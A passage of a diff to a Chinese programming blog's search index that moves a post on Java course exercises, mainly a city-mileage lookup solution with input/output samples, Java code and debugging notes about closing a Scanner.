function_">Test</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		Init();</span><br><span class="line">		run();</span><br><span class="line">		System.out.println(Count());</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">The_final_exam</span>().Test();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>简单模拟题....<br>用两个二维数组来存细胞，细胞自动机每执行一次，遍历数组1一次，对数组1中每个细胞的状态进行判断，计算周围活着的细胞的数量，然后对数组2进行相应的操作，所有操作完成后将数组2拷贝至数组1。<br>这里判断细胞周围活着的细胞数量时有一个小技巧，不需要对每种边界情况进行处理,可以将数组开大点，下标从1开始使用，相当于在所使用的有效数组空间外面绕了一圈，避免数组越界。</p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>面向对象程序设计_Java语言_翁恺</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
@@ -4065,37 +4065,6 @@ def main(q: Optional[str] = None):
       </tags>
   </entry>
   <entry>
-    <title>第三周编程题_查找里程</title>
-    <url>/posts/25475/</url>
-    <content><![CDATA[<h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>下图为国内主要城市之间的公路里程：</p>
-<p><img data-src="/images/6630868754095812824.jpg"></p>
-<p>你的程序要读入这样的一张表，然后，根据输入的两个城市的名称，给出这两个城市之间的里程。</p>
-<p>注意：任何两个城市之间的里程都已经给出，不需要计算经第三地中转。<br>注意：你并不需要去录入上图的数据，数据是在程序输入中给的。</p>
-<span id="more"></span>
-<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h2><p>首先，你会读到若干个城市的名字。每个名字都只是一个英文单词，中间不含空格或其他符号。当读到名字为“###”（三个#号）时，表示城市名字输入结束，###并不是一个城市的名字。如果记读到的城市名字的数量为n。<br>然后，你会读到nxn的一个整数矩阵。第一行的每一个数字，表示上述城市名单中第一个城市依次到另一个城市之间的里程。表中同一个城市之间的里程为0。<br>最后，你会读到两个城市的名字。</p>
-<h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>输出这两个城市之间的距离。</p>
-<h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><div class="note default no-icon"><p>Hagzou Hugzou Jigxng ###
-0 1108 708
-1108 0 994
-708 994 0
-Hagzou Jigxng
-</p></div>
-
-<h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><div class="note default no-icon"><p>708
-</p></div>
-
-<p><strong>时间限制：500ms内存限制：32000kb</strong></p>
-<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 面向对象程序设计_Java语言_翁恺;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Third_Week</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> ArrayList&lt;String&gt; city = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">	<span class="keyword">private</span> HashMap&lt;String, HashMap&lt;String, Integer&gt;&gt; distince = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, HashMap&lt;String, Integer&gt;&gt;();</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 输入城市名及距离</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">input</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line"><span class="comment">//		Scanner in = new Scanner(System.in);</span></span><br><span class="line">		String temp;</span><br><span class="line">		<span class="comment">// 读入城市名</span></span><br><span class="line">		<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			temp = in.next();</span><br><span class="line">			<span class="keyword">if</span> (temp.equals(<span class="string">&quot;###&quot;</span>) == <span class="literal">true</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			city.add(temp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 读入距离</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; city.size(); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			HashMap&lt;String, Integer&gt; temp_hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Integer&gt;();</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; city.size(); j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="type">int</span> <span class="variable">dis</span> <span class="operator">=</span> in.nextInt();</span><br><span class="line">				temp_hashmap.put(city.get(j), dis);</span><br><span class="line">			&#125;</span><br><span class="line">			distince.put(city.get(i), temp_hashmap);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">//		in.close();</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 查找两个城市间的距离</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(String start, String end)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">		dis = distince.get(start).get(end);</span><br><span class="line">		<span class="keyword">return</span> dis;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Third_Week</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Third_Week</span>();</span><br><span class="line"><span class="comment">//		Scanner in = new Scanner(System.in);</span></span><br><span class="line">		dis.input();</span><br><span class="line">		<span class="type">String</span> <span class="variable">start</span> <span class="operator">=</span> in.next();</span><br><span class="line">		<span class="type">String</span> <span class="variable">end</span> <span class="operator">=</span> in.next();</span><br><span class="line">		System.out.println(dis.search(start, end));</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>题目中给的样例有问题，有的地方多了几个空格，导致在本机测样例的时候，一直无输出，调试了半天。<br>手打了样例之后，发现要查询的两个城市的名字无法读入，怀疑是scanner关闭了两次的问题，注释掉input()方法中的<code>in.close()</code>，果然。。。<br>但是又有个warning，提示<code>input()</code>方法中的in没有关闭。强迫症，把scanner写成全局的，完美解决。<br>开始没读清题意，以为要查询多组城市间的距离，查了下Java中读到末尾的方法，学会了<code>hasnext()</code>等方法。<br>链接：<a href="http://blog.csdn.net/kejizuiqianfang/article/details/55253698">java中关于判断文本文件读到文件尾</a><br>链接：<a href="http://blog.csdn.net/wn1017888485/article/details/46039361">java使用两个scanner，关闭输入流</a></p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>面向对象程序设计_Java语言_翁恺</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>第一周编程题_分数</title>
     <url>/posts/47907/</url>
     <content><![CDATA[<h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>设计一个表示分数的类Fraction。这个类用两个int类型的变量分别表示分子和分母。</p>
@@ -4133,6 +4102,37 @@ import java.util.Scanner;
 
 <p>初学Java，按照C++中的习惯，开始的时候果断写成了下图这样&#x2F;捂脸~<br>好菜~~</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Fraction <span class="title function_">plus</span><span class="params">(Fraction r)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> <span class="variable">aa</span> <span class="operator">=</span> a * r.b + r.a * b;</span><br><span class="line">	<span class="type">int</span> <span class="variable">bb</span> <span class="operator">=</span> b * r.b;</span><br><span class="line">	Fraction <span class="title function_">temp</span><span class="params">(aa, bb)</span>;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>面向对象程序设计_Java语言_翁恺</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第三周编程题_查找里程</title>
+    <url>/posts/25475/</url>
+    <content><![CDATA[<h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>下图为国内主要城市之间的公路里程：</p>
+<p><img data-src="/images/6630868754095812824.jpg"></p>
+<p>你的程序要读入这样的一张表，然后，根据输入的两个城市的名称，给出这两个城市之间的里程。</p>
+<p>注意：任何两个城市之间的里程都已经给出，不需要计算经第三地中转。<br>注意：你并不需要去录入上图的数据，数据是在程序输入中给的。</p>
+<span id="more"></span>
+<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h2><p>首先，你会读到若干个城市的名字。每个名字都只是一个英文单词，中间不含空格或其他符号。当读到名字为“###”（三个#号）时，表示城市名字输入结束，###并不是一个城市的名字。如果记读到的城市名字的数量为n。<br>然后，你会读到nxn的一个整数矩阵。第一行的每一个数字，表示上述城市名单中第一个城市依次到另一个城市之间的里程。表中同一个城市之间的里程为0。<br>最后，你会读到两个城市的名字。</p>
+<h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>输出这两个城市之间的距离。</p>
+<h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><div class="note default no-icon"><p>Hagzou Hugzou Jigxng ###
+0 1108 708
+1108 0 994
+708 994 0
+Hagzou Jigxng
+</p></div>
+
+<h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><div class="note default no-icon"><p>708
+</p></div>
+
+<p><strong>时间限制：500ms内存限制：32000kb</strong></p>
+<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 面向对象程序设计_Java语言_翁恺;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Third_Week</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> ArrayList&lt;String&gt; city = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">	<span class="keyword">private</span> HashMap&lt;String, HashMap&lt;String, Integer&gt;&gt; distince = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, HashMap&lt;String, Integer&gt;&gt;();</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 输入城市名及距离</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">input</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line"><span class="comment">//		Scanner in = new Scanner(System.in);</span></span><br><span class="line">		String temp;</span><br><span class="line">		<span class="comment">// 读入城市名</span></span><br><span class="line">		<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			temp = in.next();</span><br><span class="line">			<span class="keyword">if</span> (temp.equals(<span class="string">&quot;###&quot;</span>) == <span class="literal">true</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			city.add(temp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 读入距离</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; city.size(); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			HashMap&lt;String, Integer&gt; temp_hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Integer&gt;();</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; city.size(); j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="type">int</span> <span class="variable">dis</span> <span class="operator">=</span> in.nextInt();</span><br><span class="line">				temp_hashmap.put(city.get(j), dis);</span><br><span class="line">			&#125;</span><br><span class="line">			distince.put(city.get(i), temp_hashmap);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">//		in.close();</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 查找两个城市间的距离</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(String start, String end)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">		dis = distince.get(start).get(end);</span><br><span class="line">		<span class="keyword">return</span> dis;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Third_Week</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Third_Week</span>();</span><br><span class="line"><span class="comment">//		Scanner in = new Scanner(System.in);</span></span><br><span class="line">		dis.input();</span><br><span class="line">		<span class="type">String</span> <span class="variable">start</span> <span class="operator">=</span> in.next();</span><br><span class="line">		<span class="type">String</span> <span class="variable">end</span> <span class="operator">=</span> in.next();</span><br><span class="line">		System.out.println(dis.search(start, end));</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>题目中给的样例有问题，有的地方多了几个空格，导致在本机测样例的时候，一直无输出，调试了半天。<br>手打了样例之后，发现要查询的两个城市的名字无法读入，怀疑是scanner关闭了两次的问题，注释掉input()方法中的<code>in.close()</code>，果然。。。<br>但是又有个warning，提示<code>input()</code>方法中的in没有关闭。强迫症，把scanner写成全局的，完美解决。<br>开始没读清题意，以为要查询多组城市间的距离，查了下Java中读到末尾的方法，学会了<code>hasnext()</code>等方法。<br>链接：<a href="http://blog.csdn.net/kejizuiqianfang/article/details/55253698">java中关于判断文本文件读到文件尾</a><br>链接：<a href="http://blog.csdn.net/wn1017888485/article/details/46039361">java使用两个scanner，关闭输入流</a></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>面向对象程序设计_Java语言_翁恺</category>
       </categories>
